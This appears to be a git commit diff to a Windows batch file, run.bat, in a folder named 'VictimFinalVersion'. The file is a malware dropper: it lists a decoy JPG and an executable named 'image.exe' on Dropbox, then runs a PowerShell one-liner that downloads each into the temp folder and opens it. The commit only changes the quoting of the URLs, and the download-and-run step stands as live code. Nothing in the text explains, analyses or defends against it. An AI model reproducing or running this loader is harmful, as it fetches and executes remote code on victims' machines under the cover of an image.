a0471529382fcb0dd6181fd8ec6a9a3f28415b79
devkaare <kaarehofferdal@gmail.com>
2025-02-02 04:25:57 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -1,5 +1,5 @@
 @echo off
 
-set files="https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg","https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0"
+set files='https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg','https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
